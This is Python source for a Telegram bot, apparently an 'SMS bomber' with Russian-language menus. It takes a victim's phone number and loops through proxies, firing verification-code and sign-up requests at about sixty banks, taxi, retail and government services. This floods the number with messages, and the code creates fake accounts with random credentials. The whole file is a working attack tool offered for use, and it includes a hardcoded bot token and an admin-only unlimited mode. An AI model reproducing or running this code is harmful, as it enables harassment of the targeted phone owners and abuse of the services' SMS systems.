import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
from telebot import apihelper
import telebot
import time
import random
from pprint import pprint
from sparser import Parser


TOKEN = '911989161:AAHSwX1UOIjxqfZzhVEjMlghG0nDa5DMSLk'

THREADS_LIMIT = 700

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 318377477
COUNT_SERV = 62

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
parser = Parser()

apihelper.proxy = {"https": random.choice(parser.load_proxies())}
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

def save_chat_id(chat_id):
	"Функция добавляет чат айди в файл если его там нету"
	chat_id = str(chat_id)
	with open(chat_ids_file,"a+") as ids_file:
		ids_file.seek(0)

		ids_list = [line.split('\n')[0] for line in ids_file]

		if chat_id not in ids_list:
			ids_file.write(f'{chat_id}\n')
			ids_list.append(chat_id)
			print(f'New chat_id saved: {chat_id}')
		else:
			print(f'chat_id {chat_id} is already saved')
		users_amount[0] = len(ids_list)
	return


def send_message_users(message):
	def send_message(chat_id):
		data = {
			'chat_id': chat_id,
			'text': message
		}
		response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

	with open(chat_ids_file, "r") as ids_file:
		ids_list = [line.split('\n')[0] for line in ids_file]

	[send_message(chat_id) for chat_id in ids_list]


@bot.message_handler(commands=['start'])
def start(message):
	keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
	boom = types.KeyboardButton(text='Атака на номер')
	stop = types.KeyboardButton(text='Стоп Спам')
	stats = types.KeyboardButton(text='Статистика')

	buttons_to_add = [boom, stop, stats]

	if int(message.chat.id) == ADMIN_CHAT_ID:
		buttons_to_add.append(types.KeyboardButton(text='Рассылка'))

	keyboard.add(*buttons_to_add)
	bot.send_message(message.chat.id, 'Добро пожаловать!\nОтветственность за ваши действия несете лично вы!\nВыберите действие',  reply_markup=keyboard)
	save_chat_id(message.chat.id)


def send_for_number(phone):
	request_timeout = 0.00001
	_text = 'Тебе жжопа)))'
	_name = ''
	for x in range(12):
		_name += random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	_phone = phone
	if _phone[0] == '+':
		_phone = _phone[1:]
	if _phone[0] == '8':
		_phone = '7'+_phone[1:]
	if _phone[0] == '9':
		_phone = '7'+_phone

	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'

	iteration = 0
	count = 0
	proxies = {"https": random.choice(parser.load_proxies())}
	while True:
		_email = _name+f'{iteration}'+'@gmail.com'
		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, proxies=proxies)
			requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number': _phone9,'version': '2'}, headers={}, proxies=proxies)
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, proxies=proxies)
			requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={}, proxies=proxies)
			requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={}, proxies=proxies)
			requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={}, proxies=proxies)
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, proxies=proxies)
			requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={}, proxies=proxies)
			requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={}, proxies=proxies)
			requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={}, proxies=proxies)
			requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin}, proxies=proxies)
			requests.post('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp', params={'type': 'sendConfirmCode', 'phoneNumber': _phone}, proxies=proxies)
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, proxies=proxies)
			requests.post('http://youdrive.today/signup/phone', data={'phone': _phone, 'phone_code':'7'}, proxies=proxies)
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'}, proxies=proxies)
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone}, proxies=proxies)
			requests.post('http://www.aramba.ru/core.php', data={'act': 'codeRequest', 'phone': '+'+_phone, 'l': _name, 'p': _name, 'name': _name, 'email': _name + '@gmail.com'}, proxies=proxies)
			requests.post('https://online-api.dozarplati.com/rpc', json={'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': _phone}}, proxies=proxies)
			requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'}, proxies=proxies)
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone}, proxies=proxies)
			requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', json={'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}}, proxies=proxies)
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _text,'phone': _phone}, proxies=proxies)
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone}, proxies=proxies)
			requests.get('https://www.maxidom.ru/ajax/doRegister.php', params={'send_code_again': 'Y', 'phone': _phone, 'email': _name+'@gmail.com', 'code_type': 'phone'}, proxies=proxies)
			requests.post('https://www.oyorooms.com/api/pwa/generateotp', params={'phone': _phone[1:], 'country_code': '+' + _phone}, proxies=proxies)
			requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': _phone, 'type': '0'}, proxies=proxies)
			requests.post('https://api-user.privetmir.ru/api/send-code', data={'approve1': 'on', 'approve2': 'on', 'checkApproves': 'Y', 'checkExist': 'Y','login': _phone, 'scope': 'register-user'}, proxies=proxies)
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': _phone}, proxies=proxies)
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}, proxies=proxies)
			requests.post('https://online.optima.taxi/user/get-code', data={'phone': _phone}, proxies=proxies)
			requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]}, proxies=proxies)
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, proxies=proxies)
			requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name}, proxies=proxies)
			requests.post('https://api-ru-manage.voximplant.com/api/SendActivationCode',data={'phone': _phone, 'account_email': _name + '@gmail.com'}, proxies=proxies)
			requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'}, proxies=proxies)
			requests.post('https://login.mos.ru/sps/recovery/start', json={'login': _phone, 'attr': ''}, proxies=proxies)
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}, proxies=proxies)
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, proxies=proxies)
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}, proxies=proxies)
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, proxies=proxies)
			requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone}, proxies=proxies)
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, proxies=proxies)
			requests.post('https://b.utair.ru/api/v1/login/', json={"login":_phone}, proxies=proxies)
			requests.post('https://www.aresbank.ru/ajax/register.php', data={'REGISTER[NAME]': 'Иванов Иван Иванович','REGISTER[PERSONAL_PHONE]': _phoneAresBank,'REGISTER[LOGIN]': _name+f'{iteration}','REGISTER[PASSWORD]': _name+'-/'+_name,'REGISTER[CONFIRM_PASSWORD]': _name+'-/'+_name,'REGISTER[ACTION]': 'register','register_submit_button': 'Регистрация'}, proxies=proxies)
			requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':_phone9,'Package':'optimal'}, proxies=proxies)
			requests.post('https://sfera.ru/api/quiz/id', json={"phone":_phonePizzahut,"regno":"1021400692048"}, proxies=proxies)
			requests.post('https://www.bystrobank.ru/publogin/web/register.php', data={'referer::-0':'','realm::-0':'bbpwd','loginName-0':_name,'password::-0':_name,'passwordRepeat::-0':_name,'phoneNumber::-0':_phone9,'ruPhoneCheck::-0':'true','email::-0':_email,'registration':'','serviceName-0':'lc'}, proxies=proxies)



			requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone}, proxies=proxies)
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={}, proxies=proxies)
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, proxies=proxies)
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone}, proxies=proxies)
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'}, proxies=proxies)
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone}, proxies=proxies)
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone}, proxies=proxies)
			requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + phone}, proxies=proxies)
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone}, proxies=proxies)
			requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone}, proxies=proxies)
			requests.post('https://www.rabota.ru/remind', data={'credential': phone}, proxies=proxies)
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={}, proxies=proxies)
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={}, proxies=proxies)
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies=proxies)
		except requests.exceptions.ConnectionError:
			count += 1
			print(f"Умер {count} сервис")
			proxies = random.choice(parser.load_proxies())

def start_spam(chat_id, phone_number, force):
	running_spams_per_chat_id.append(chat_id)

	if force:
		msg = f'Спам запущен на неограниченое время для номера +{phone_number}'
	else:
		msg = f'Спам запущен на 10 минут на номер +{phone_number}'

	bot.send_message(chat_id, msg)
	end = datetime.now() + timedelta(minutes = 10)
	while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
		if chat_id not in running_spams_per_chat_id:
			break
		send_for_number(phone_number)
	bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
	THREADS_AMOUNT[0] -= 1
	try:
		running_spams_per_chat_id.remove(chat_id)
	except Exception:
		pass


def spam_handler(phone, chat_id, force):
	if int(chat_id) in running_spams_per_chat_id and int(chat_id) != ADMIN_CHAT_ID:
		bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова')
		return

	# Если количество тредов меньше максимального создается новый который занимается спамом
	if THREADS_AMOUNT[0] < THREADS_LIMIT:
		x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
		threads.append(x)
		THREADS_AMOUNT[0] += 1
		x.start()
	else:
		bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
		print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
	chat_id = int(message.chat.id)
	text = message.text

	if text == 'Атака на номер':
		bot.send_message(chat_id, 'Введите номер без + в формате:\n380xxxxxxxxx\n79xxxxxxxxx')

	elif text == 'Статистика':
		bot.send_message(chat_id, f'Статистика отображается в реальном времени!\nПользователей: {users_amount[0]}\nСервисов всего: {COUNT_SERV}')
	
	elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
		bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')
	
	elif text == 'Стоп Спам':
		if chat_id not in running_spams_per_chat_id:
			bot.send_message(chat_id, 'Вы еще не начинали спам')
		else:
			running_spams_per_chat_id.remove(chat_id)

	elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
		msg = text.replace("РАЗОСЛАТЬ: ","")
		send_message_users(msg)

	elif len(text) == 11:
		phone = text
		spam_handler(phone, chat_id, force=False)


	elif len(text) == 12:
		phone = text
		spam_handler(phone, chat_id, force=False)



	elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
		phone = text[1:]
		spam_handler(phone, chat_id, force=True)

	else:
		bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
		print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

def main():
	bot.polling(none_stop=True)


if __name__ == '__main__':
	main()
